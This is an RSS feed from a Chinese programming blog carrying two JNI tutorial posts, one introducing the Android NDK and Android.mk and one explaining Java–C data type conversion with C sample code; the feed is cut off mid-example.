<?xml version="1.0" encoding="UTF-8"?>
<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[白一梓的个人博客]]></title><description><![CDATA[A blog about tech.]]></description><link>http://blog.whyun.com</link><generator>RSS for Node</generator><lastBuildDate>Sat, 05 Dec 2015 13:07:27 GMT</lastBuildDate><atom:link href="http://blog.whyun.com/feed.xml" rel="self" type="application/rss+xml"/><author><![CDATA[白一梓]]></author><pubDate>Sat, 05 Dec 2015 13:07:27 GMT</pubDate><copyright><![CDATA[2015 白一梓]]></copyright><language><![CDATA[en]]></language><managingEditor><![CDATA[白一梓]]></managingEditor><webMaster><![CDATA[白一梓]]></webMaster><ttl>60</ttl><item><title><![CDATA[JNI系列教程三 —— NDK入门]]></title><description><![CDATA[<h2><a name="3-1" class="anchor" href="#3-1"><span class="header-link"></span></a>3.1 背景</h2>
<p>谈到JNI的使用场景，最常用的就是android NDK的编写了。首先从<a href="http://developer.android.com/ndk/downloads/index.html#download">http://developer.android.com/ndk/downloads/index.html#download</a> 把最新版的NDK下载下来。下载完之后得到一个exe文件，这其实是一个自解压文件，运行后自动解压，解压完成后的文件夹有3GB，所以你的磁盘空间起码得留足5GB左右的剩余空间。
最终我们得到这么一个目录结构：</p>
<p><img src="/images/ndk_dir.jpg" alt="ndk目录结构"><br><strong>图3.1.1 ndk目录结构</strong><br>接着需要将ndk所在目录添加到环境变量PATH中，这样在以后运行的时候，只需要输出<code>ndk-buld</code>就可以了。文件夹<code>plantforms</code>存放着编译各个版本的android所需的头文件和动态库，举个例子<code>platforms/android-3/arch-arm</code>文件夹下存放的是<code>android 1.5</code>版本的<code>arm</code>平台的头文件和库文件，从<code>android 2.3</code>开始，开始支持<code>x86</code>和<code>mips</code>两个平台，所以在<code>platforms/android-9</code>目录下会有<code>arch-arm</code> <code>arch-mips</code> <code>arch-x86</code>三个文件夹。</p>
<blockquote>
<p>本文源地址：<a href="http://blog.whyun.com/posts/jni-ndk/">http://blog.whyun.com/posts/jni-ndk/</a> 转载请注明出处。</p>
</blockquote>
<h2><a name="3-2-android-mk" class="anchor" href="#3-2-android-mk"><span class="header-link"></span></a>3.2 Android.mk</h2>
<p>mk后缀的文件是makefile文件，mk文件一般通过<code>include</code>语法被引入到其它makefile中。在NDK中Android.mk里存储的都是编译相关的配置信息，我们先举一个例子：</p>
<pre><code><div class="highlight"><pre><span class="nx">LOCAL_PATH</span> <span class="o">:=</span> <span class="nx">$</span><span class="p">(</span><span class="nx">call</span> <span class="nx">my</span><span class="o">-</span><span class="nx">dir</span><span class="p">)</span>

<span class="nx">include</span> <span class="nx">$</span><span class="p">(</span><span class="nx">CLEAR_VARS</span><span class="p">)</span>

<span class="nx">LOCAL_MODULE</span> <span class="o">:=</span> <span class="nx">chapter3</span>
<span class="nx">LOCAL_CFLAGS</span> <span class="o">:=</span> <span class="o">-</span><span class="nx">DJNI_ANDROID</span>
<span class="nx">LOCAL_LDLIBS</span> <span class="o">:=</span> <span class="o">-</span><span class="nx">llog</span> <span class="o">-</span><span class="nx">lm</span>
<span class="nx">TARGET_ARCH</span> <span class="o">:=</span> <span class="nx">arm</span>
<span class="nx">TARGET_PLATFORM</span> <span class="o">:=</span> <span class="nx">android</span><span class="o">-</span><span class="mi">7</span>
<span class="nx">LOCAL_SRC_FILES</span> <span class="o">:=</span> <span class="nx">chapter3</span><span class="p">.</span><span class="nx">c</span> 

<span class="nx">$</span><span class="p">(</span><span class="nx">info</span> <span class="nx">$</span><span class="p">(</span><span class="nx">SYSROOT</span><span class="p">))</span>
<span class="nx">include</span> <span class="nx">$</span><span class="p">(</span><span class="nx">BUILD_SHARED_LIBRARY</span><span class="p">)</span>
</pre></div>
</code></pre>
<p>文件第一行中<code>my-dir</code>是一个函数，通过调用它返回当前路径，<code>CLEAR_VARS</code>变量指向一个mk文件，它会清除所有除了<code>LOCAL_PATH</code>之外的<code>LOCAL_</code>开头的变量，下面是一些列的对于<code>LOCAL_</code>开头的变量的定义：</p>
<ul>
<li>LOCAL_MODULE 定义当前生成模板的名称，注意到文件最后一行<code>include $(BUILD_SHARED_LIBRARY)</code>代表当前是要生成一个动态库，所以说将LOCAL_MODULE定义成<code>chapter3</code>后，将会得到一个<code>libchapter3.so</code>文件。</li>
<li>LOCAL_CFLAGS 定义编译用到的宏定义，当然也可以使用<code>-I</code>来指定头文件路径，不过这个使用<code>LOCAL_C_INCLUDES</code>更适合，因为后者可以被断点调试程序gdb识别。</li>
<li>TARGET_PLATFORM 指定当前使用的API版本，比如说android-9，就会使用NDK文件夹下的<code>platforms/android-9</code>中的头文件和库来参与编译（对于API版本和android版本之间的对应关系，可以参见百度百科的词条<a href="http://baike.baidu.com/view/7902337.htm">Android历史版本</a>）。</li>
<li>TARGET_ARCH 指定编译的CPU平台，不同API版本支持的类型不同，越新的API支持的CPU平台就越多，如果想查看当前API版本支持哪几个平台，去<code>plantforms/android-{API版本号}</code>中看一下便知道，比如说android-3仅仅支持一个平台<code>arch-arm</code>:<br><img src="/images/1.5arch.png" alt="1.5支持的cpu类型"><br><strong>图3.2.1 anroid 1.5支持的cpu类型</strong><br>那么android-3，可选的<code>TARGET_ARCH</code>就只有一个<code>arm</code>选项。
但是<code>android-21</code>就支持6个CPU平台：<br><img src="/images/anroid21-arch.png" alt="android-21支持的CPU类型"><br><strong>图3.2.2 android5.0 支持的CPU类型</strong><br>这样对于android5.0来说可选的选项包括<code>arm</code> <code>arm64</code> <code>mips</code> <code>mips64</code> <code>x86</code> <code>x86_64</code>
另外如果没有指定这个值的话，就会用默认的<code>arm</code></li>
<li>LOCAL_LDLIBS 指定要引用的系统库，比如例子中的<code>-llog</code>就会引用<code>`plantforms/android-{API版本号}/usr/lib/liblog.so</code>。</li>
<li>LOCAL_SRC_FILES 在这里就是要编译的c文件了，如果一行写不开，需要写多行，那么可以在每行的行尾加上 <code>\</code>。</li>
<li>BUILD_SHARED_LIBRARY 这里代表最终生成的是一个动态库文件。</li>
</ul>
<h2><a name="3-3" class="anchor" href="#3-3"><span class="header-link"></span></a>3.3 简单例子</h2>
<p>这个例子就是NDK<code>samples</code>目录中<code>hello-jni</code>项目，将这个项目随便拷贝到某一个目录，然后删除掉项目中的tests文件夹，这个是一个单元测试，我不知道怎么使用它，所以直接删除掉。然后打开eclipse，选择File-&gt;Project...-&gt;Android-&gt;Android Project From Existing Code,选择刚才拷贝后的路径，点击完成。
在命令行中进入项目的jni文件夹，然后运行<code>ndk-build</code>，你会发现程序生成了好几个so文件夹，放置于项目的<code>libs</code>文件夹中，这是由于在文件<code>Application.mk</code>（位于文件夹<code>jni</code>中）文件中这一句造成的：<br><code>APP_ABI := all</code><br><code>ABI</code>这个参数（可以参见百度百科词条<a href="http://baike.baidu.com/subview/1433570/6276632.htm">ABI</a>）比之前讲到的<code>ARCH</code>要更加细化，可以理解为在同一体系结构下CPU的不同版本，支持的指令集有所差异，android中支持的ABI可以参见<a href="http://developer.android.com/ndk/guides/abis.html">谷歌官方ABI解释</a>。最终在模拟器上运行程序成功：  </p>
<p><img src="/images/hello_jni_run_success.png" alt="运行hello-jni项目成功"><br><strong>图3.3 运行hello-jni项目成功</strong>  </p>
]]></description><link>http://blog.whyun.com/posts/jni-ndk/</link><guid isPermaLink="true">http://blog.whyun.com/posts/jni-ndk/</guid><dc:creator><![CDATA[白一梓]]></dc:creator><pubDate>Sat, 05 Dec 2015 00:00:00 GMT</pubDate></item><item><title><![CDATA[JNI系列教程二——数据结构]]></title><description><![CDATA[<p>JNI和java相互调用，一个不可避免的问题就是两者的数据结构要相互转换。这一节正是要讲这个重头戏。</p>
<blockquote>
<p>本文源地址<a href="http://blog.whyun.com/posts/jni/2-struct-transform/">http://blog.whyun.com/posts/jni/2-struct-transform/</a> 转载请注明出处。</p>
</blockquote>
<h2><a name="2-1" class="anchor" href="#2-1"><span class="header-link"></span></a>2.1 基本类型</h2>
<p>基本数据类型大都是数字类型表2.1.1中给出了java和jni的对应关系。</p>
<table>
<thead>
<tr>
<th>Java 类型</th>
<th>本地类型</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>boolean</td>
<td>jboolean</td>
<td>无符号，8 位  </td>
</tr>
<tr>
<td>byte</td>
<td>jbyte</td>
<td>无符号，8 位  </td>
</tr>
<tr>
<td>char</td>
<td>jchar</td>
<td>无符号，16 位  </td>
</tr>
<tr>
<td>short</td>
<td>jshort</td>
<td>有符号，16 位  </td>
</tr>
<tr>
<td>int</td>
<td>jint</td>
<td>有符号，32 位  </td>
</tr>
<tr>
<td>long</td>
<td>jlong</td>
<td>有符号，64 位  </td>
</tr>
<tr>
<td>float</td>
<td>jfloat</td>
<td>32 位  </td>
</tr>
<tr>
<td>double</td>
<td>jdouble</td>
<td>64 位  </td>
</tr>
</tbody>
</table>
<p><strong>表2.1.1 基本数据类型对照表</strong></p>
<h2><a name="2-2" class="anchor" href="#2-2"><span class="header-link"></span></a>2.2 对象类型</h2>
<p>对象类型的对照关系牵扯到的知识点比较多，所以下面决定通过具体例子来让大家更好的学习它。
首先在java代码有这么两行行声明</p>
<pre><code><div class="highlight"><pre><span class="kr">public</span> <span class="kr">native</span> <span class="kr">int</span> <span class="nx">getSum</span><span class="p">(</span><span class="kr">int</span> <span class="nx">a</span><span class="p">,</span> <span class="kr">int</span> <span class="nx">b</span><span class="p">);</span>
<span class="kr">public</span> <span class="kr">native</span> <span class="kr">int</span> <span class="nx">getSum</span><span class="p">(</span><span class="kr">byte</span> <span class="p">[]</span> <span class="nx">array</span><span class="p">);</span>
</pre></div>
</code></pre>
<p>第一个函数是一个基本数据类型，第二个函数是一个数组，虽然两个函数在java中是同名的，但是生成的c文件却不能使用同名文件，</p>
<pre><code class="lang-c"><div class="highlight"><pre><span class="cm">/*</span>
<span class="cm"> * Class:     com_whyun_jni_chapter2_StructDemo</span>
<span class="cm"> * Method:    getSum</span>
<span class="cm"> * Signature: (II)I</span>
<span class="cm"> */</span>
<span class="n">JNIEXPORT</span> <span class="n">jint</span> <span class="n">JNICALL</span> <span class="nf">Java_com_whyun_jni_chapter2_StructDemo_getSum__II</span>
    <span class="p">(</span><span class="n">JNIEnv</span> <span class="o">*</span><span class="n">env</span><span class="p">,</span> <span class="n">jobject</span> <span class="n">obj</span><span class="p">,</span> <span class="n">jint</span> <span class="n">a</span><span class="p">,</span> <span class="n">jint</span> <span class="n">b</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="p">;</span>
<span class="p">};</span>

<span class="cm">/*</span>
<span class="cm"> * Class:     com_whyun_jni_chapter2_StructDemo</span>
<span class="cm"> * Method:    getSum</span>
<span class="cm"> * Signature: ([B)I</span>
<span class="cm"> */</span>
<span class="n">JNIEXPORT</span> <span class="n">jint</span> <span class="n">JNICALL</span> <span class="nf">Java_com_whyun_jni_chapter2_StructDemo_getSum___3B</span>
  <span class="p">(</span><span class="n">JNIEnv</span> <span class="o">*</span><span class="n">env</span><span class="p">,</span> <span class="n">jobject</span> <span class="n">obj</span><span class="p">,</span> <span class="n">jbyteArray</span> <span class="n">arr</span><span class="p">)</span> <span class="p">{</span>
      <span class="kt">int</span> <span class="n">sum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="kt">char</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">GetByteArrayElements</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="n">arr</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
      <span class="kt">int</span> <span class="n">dataLen</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">GetArrayLength</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="n">arr</span><span class="p">);</span>
      <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">dataLen</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">sum</span> <span class="o">+=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
      <span class="p">}</span>
      <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">ReleaseByteArrayElements</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="n">arr</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
      <span class="k">return</span> <span class="p">(</span><span class="n">jint</span><span class="p">)</span><span class="n">sum</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</code></pre>
<p>我们通过<code>javah</code>生成头文件时，就会发现生成的getSum的函数后缀是不一样的。这里重点看JNI中对数组的操作，在实际编程中我们常常要处理二进制数据，那么自己数组便是经常要使用的一个数据结构了。java中的byte[]最终在JNI中被转化为jbyteArray，但是jbyteArray要想在C语言中使用，还必须得到一个C语言中可识别的char类型指针的形式，这就是函数GetByteArrayElements的作用。要想知道当前数组的长度，可以使用函数GetArrayLength。我们可以推断出GetByteArrayElements内部申请了一块内存，也就是说变量<code>data</code>是通过类似于malloc之类的函数申请得到的，所以最终在使用完成之后是需要释放的，所以才有了函数最后调用ReleaseByteArrayElements函数的代码。</p>
<p>下面看一个复杂的例子通过JNI来调用java函数,直接上JNI的代码：</p>
<pre><code class="lang-c"><div class="highlight"><pre><span class="cm">/*</span>
<span class="cm"> * Class:     com_whyun_jni_chapter2_StructDemo</span>
<span class="cm"> * Method:    getUserList</span>
<span class="cm"> * Signature: (I)Ljava/util/ArrayList;</span>
<span class="cm"> */</span>
<span class="n">JNIEXPORT</span> <span class="n">jobject</span> <span class="n">JNICALL</span> <span class="nf">Java_com_whyun_jni_chapter2_StructDemo_getUserList</span>
  <span class="p">(</span><span class="n">JNIEnv</span> <span class="o">*</span><span class="n">env</span><span class="p">,</span> <span class="n">jobject</span> <span class="n">obj</span><span class="p">,</span> <span class="n">jint</span> <span class="n">num</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">num</span><span class="p">,</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
    <span class="n">jclass</span> <span class="n">clsUserBean</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">FindClass</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="s">&quot;com/whyun/jni/bean/UserBean&quot;</span><span class="p">);</span>
    <span class="n">jclass</span> <span class="n">clsArrayList</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">FindClass</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="s">&quot;java/util/ArrayList&quot;</span><span class="p">);</span>
    <span class="n">jmethodID</span> <span class="n">userBeanConstructor</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">GetMethodID</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="n">clsUserBean</span><span class="p">,</span><span class="s">&quot;&lt;init&gt;&quot;</span><span class="p">,</span><span class="s">&quot;()V&quot;</span><span class="p">);</span>
    <span class="n">jmethodID</span> <span class="n">userBeanSetAge</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">GetMethodID</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="n">clsUserBean</span><span class="p">,</span><span class="s">&quot;setAge&quot;</span><span class="p">,</span><span class="s">&quot;(I)V&quot;</span><span class="p">);</span>
    <span class="n">jmethodID</span> <span class="n">userBeanSetName</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">GetMethodID</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="n">clsUserBean</span><span class="p">,</span><span class="s">&quot;setName&quot;</span><span class="p">,</span><span class="s">&quot;(Ljava/lang/String;)V&quot;</span><span class="p">);</span>
    <span class="n">jmethodID</span> <span class="n">arrayListContructor</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">GetMethodID</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="n">clsArrayList</span><span class="p">,</span><span class="s">&quot;&lt;init&gt;&quot;</span><span class="p">,</span><span class="s">&quot;(I)V&quot;</span><span class="p">);</span>
    <span class="n">jmethodID</span> <span class="n">arrayListAdd</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">GetMethodID</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="n">clsArrayList</span><span class="p">,</span><span class="s">&quot;add&quot;</span><span class="p">,</span><span class="s">&quot;(ILjava/lang/Object;)V&quot;</span><span class="p">);</span>

    <span class="n">jobject</span> <span class="n">arrayList</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">NewObject</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="n">clsArrayList</span><span class="p">,</span><span class="n">arrayListContructor</span><span class="p">,</span><span class="n">num</span><span class="p">);</span>

    <span class="kt">char</span> <span class="n">nameStr</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">jstring</span> <span class="n">name</span><span class="p">;</span>

    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">count</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">jobject</span> <span class="n">userBean</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">NewObject</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="n">clsUserBean</span><span class="p">,</span><span class="n">userBeanConstructor</span><span class="p">);</span>

        <span class="k">for</span> <span class="p">(</span><span class="n">index</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">index</span><span class="o">&lt;</span><span class="mi">4</span><span class="p">;</span><span class="n">index</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">nameStr</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">randStr</span><span class="p">[(</span><span class="n">i</span><span class="o">+</span><span class="mi">7</span><span class="p">)</span><span class="o">%</span><span class="mi">5</span><span class="p">];</span>
        <span class="p">}</span>
        <span class="n">name</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">NewStringUTF</span><span class="p">(</span><span class="n">env</span><span class="p">,(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">nameStr</span><span class="p">);</span>
        <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">CallVoidMethod</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="n">userBean</span><span class="p">,</span><span class="n">userBeanSetAge</span><span class="p">,(</span><span class="n">jint</span><span class="p">)(</span><span class="mi">20</span><span class="o">+</span><span class="n">i</span><span class="p">));</span>
        <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">CallVoidMethod</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="n">userBean</span><span class="p">,</span><span class="n">userBeanSetName</span><span class="p">,</span><span class="n">name</span><span class="p">);</span>

        <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">CallVoidMethod</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="n">arrayList</span><span class="p">,</span><span class="n">arrayListAdd</span><span class="p">,(</span><span class="n">jint</span><span class="p">)</span><span class="n">i</span><span class="p">,</span><span class="n">userBean</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">arrayList</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</code></pre>
<p>如果你稍加揣测的话，这段代码翻译成java代码应该是这么写的：</p>
<pre><code class="lang-java"><div class="highlight"><pre><span class="kd">public</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">UserBean</span><span class="o">&gt;</span> <span class="nf">getUserList</span><span class="o">(</span><span class="kt">int</span> <span class="n">count</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">UserBean</span><span class="o">&gt;</span> <span class="n">list</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">UserBean</span><span class="o">&gt;(</span><span class="n">count</span><span class="o">);</span>
    <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">count</span><span class="o">;</span><span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
        <span class="n">UserBean</span> <span class="n">bean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">UserBean</span><span class="o">();</span>
        <span class="n">bean</span><span class="o">.</span><span class="na">setAge</span><span class="o">(</span><span class="n">i</span><span class="o">+</span><span class="mi">20</span><span class="o">);</span>
        <span class="n">bean</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="s">&quot;name&quot;</span><span class="o">+</span><span class="n">i</span><span class="o">);</span>
        <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">i</span><span class="o">,</span><span class="n">bean</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="n">list</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
</code></pre>
<p>看上去java代码要简单许多，在JNI中包括类、成员函数、对象之类的数据都需要先创建再使用。在java中创建对象用<code>new UserBean()</code>就够了，但是在JNI中，你首先要通过<code>FindClass</code>函数来找到类定义，然后通过类定义用函数<code>GetMethodID</code>来找到构造函数，然后根据类定义和构造函数通过函数<code>NewObject</code>来获取一个对象，下面分别对这三个函数进行讲解。<br><code>FindClass</code>函数的第二个参数是要加载的类的类名全称，在java中我们应该写作<code>com.whyun.jni.bean.UserBean</code>,在JNI中就是把<code>.</code>换成了<code>/</code>而已。<br><code>GetMethodID</code>函数的第二个参数是<code>FindClass</code>函数得到的类变量<code>clsUserBean</code>,第二个参数是函数名，一般来说函数名直接写函数名称就行了，比如说你再往下看一行代码获取UserBean的<code>setAge</code>函数的时候就直接写的函数名，但是构造函数就不同了，所有类的构造函数在JNI中统一叫<code>&lt;init&gt;</code>。最后一个参数很重要，它是java函数的签名，java中每个函数和属性都有一个它的标识，这个标识用来指出当前函数的参数、返回值类型或者属性的类名，可能有些人第一听说这个概念，其实获取这个标识有一个很简单的方法，就是命令<code>javap</code>，下面先做个小实验，运行<code>javap -s java.lang.String</code>，会输出如下内容：</p>
<pre><code><div class="highlight"><pre><span class="nx">Compiled</span> <span class="nx">from</span> <span class="s2">&quot;String.java&quot;</span>
<span class="kr">public</span> <span class="kr">final</span> <span class="kr">class</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nb">String</span> <span class="kr">implements</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">Serializable</span><span class="p">,</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Comparable</span><span class="o">&lt;</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nb">String</span><span class="o">&gt;</span><span class="p">,</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">CharSequence</span> <span class="p">{</span>
  <span class="kr">public</span> <span class="kr">static</span> <span class="kr">final</span> <span class="nx">java</span><span class="p">.</span><span class="nx">util</span><span class="p">.</span><span class="nx">Comparator</span><span class="o">&lt;</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nb">String</span><span class="o">&gt;</span> <span class="nx">CASE_INSENSITIVE_ORDER</span><span class="p">;</span>
    <span class="nx">Signature</span><span class="o">:</span> <span class="nx">Ljava</span><span class="o">/</span><span class="nx">util</span><span class="o">/</span><span class="nx">Comparator</span><span class="p">;</span>
  <span class="kr">public</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nb">String</span><span class="p">();</span>
    <span class="nx">Signature</span><span class="o">:</span> <span class="p">()</span><span class="nx">V</span>

  <span class="kr">public</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nb">String</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nb">String</span><span class="p">);</span>
    <span class="nx">Signature</span><span class="o">:</span> <span class="p">(</span><span class="nx">Ljava</span><span class="o">/</span><span class="nx">lang</span><span class="o">/</span><span class="nb">String</span><span class="p">;)</span><span class="nx">V</span>

  <span class="kr">public</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nb">String</span><span class="p">(</span><span class="kr">char</span><span class="p">[]);</span>
    <span class="nx">Signature</span><span class="o">:</span> <span class="p">([</span><span class="nx">C</span><span class="p">)</span><span class="nx">V</span>

  <span class="kr">public</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nb">String</span><span class="p">(</span><span class="kr">char</span><span class="p">[],</span> <span class="kr">int</span><span class="p">,</span> <span class="kr">int</span><span class="p">);</span>
    <span class="nx">Signature</span><span class="o">:</span> <span class="p">([</span><span class="nx">CII</span><span class="p">)</span><span class="nx">V</span>

  <span class="kr">public</span> <span class="nx">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nb">String</span><span class="p">(</span><span class="kr">int</span><span class="p">[],</span> <span class="kr">int</span><span class="p">,</span> <span class="kr">int</span><span class="p">);</span>
    <span class="nx">Signature</span><span class="o">:</span> <span class="p">([</span><span class="nx">III</span><span class="p">)</span><span class="nx">V</span>
<span class="err">由于文件内容比较多，所以省略掉下面内容</span>
</pre></div>
</code></pre>
<p>由于java是支持重载的，一个函数可能会拥有多种实现方式，比如<code>String</code>类的构造函数就有N多个，那么你在调用其函数的时候，就必须得依靠参数和返回值类型来区分不同的函数了，而签名正提供了一种简介的方式来表示一个函数的参数和返回值。通过刚才<code>javap</code>命令的输出，我们可以得到对于没有参数的String构造函数，其签名为<code>()V</code>；对于参数为字符数组的构造函数签名为<code>([C)V</code>。
接着讲函数<code>NewObject</code>,前面经过<code>FindClass</code>和<code>GetMethodID</code>一顿折腾，我们拿到了两个变量类变量<code>clsUserBean</code>和函数变量<code>userBeanConstructor</code>,将其传到<code>NewObject</code>中就能得到一个对象。在我们的代码中还有一个对于ArrayList类型的对象的构造，他调用<code>NewObject</code>的时候比<code>UserBean</code>多了一个参数，那是由于我们使用的构造函数为<code>ArrayList(int i)</code>，故需要传递一个ArrayList的长度参数，这里需要声明的是<code>NewObject</code>函数的参数个数是可变的，调用的构造函数有参数，就依次追加到后面即可。
终于讲到真正调用java函数这一步了，就是代码中的<code>CallVoidMethod</code>,和<code>NewObject</code>一样，它也是可变参数，参数形式也一样。除了<code>CallVoidMethod</code>，JNI中还有各种<code>Call[Type]Method</code>，这个Type就代表了java函数的返回值，它可以是<code>Object</code> <code>Boolean</code> <code>Byte</code> <code>Char</code> <code>Short</code> <code>Int</code> <code>Long</code> <code>Float</code> <code>Double</code>。</p>
<h2><a name="2-3" class="anchor" href="#2-3"><span class="header-link"></span></a>2.3 使用异常</h2>
<p>c语言中没有异常这个概念，使用c代码的时候多是通过返回码来判断是否调用成功，然而对于java程序来说判断有没有成功，往往是看有没有异常抛出，所以说编写一个java友好的JNI程序，我们需要将错误码转成java异常。直接上例子：</p>
<pre><code class="lang-c"><div class="highlight"><pre><span class="cm">/*</span>
<span class="cm"> * Class:     com_whyun_jni_chapter2_StructDemo</span>
<span class="cm"> * Method:    showException</span>
<span class="cm"> * Signature: ()V</span>
<span class="cm"> */</span>
<span class="n">JNIEXPORT</span> <span class="kt">void</span> <span class="n">JNICALL</span> <span class="nf">Java_com_whyun_jni_chapter2_StructDemo_showException</span>
  <span class="p">(</span><span class="n">JNIEnv</span> <span class="o">*</span><span class="n">env</span><span class="p">,</span> <span class="n">jobject</span> <span class="n">obj</span><span class="p">)</span> <span class="p">{</span>
